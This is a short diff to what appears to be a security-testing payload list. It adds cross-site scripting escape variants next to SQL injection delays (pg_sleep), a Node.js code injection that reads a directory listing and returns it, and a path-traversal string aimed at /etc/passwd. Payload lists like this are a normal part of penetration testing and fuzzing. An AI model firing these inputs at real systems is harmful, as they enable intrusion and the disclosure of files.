@@ -27,7 +27,9 @@ pg_sleep(5)--
 ");pg_sleep(5)--
 <script>alert(1)</script>
 asdf"><script>alert(1)</script>
-asdf);alert(1);//
+asdf'><script>alert(1)</script>
+asdf");alert(1);//
+asdf');alert(1);//
 ");console.log(1);
 ");res.end(require('fs').readdirSync('.').toString());
 ../../../../../../../../../../etc/passwd
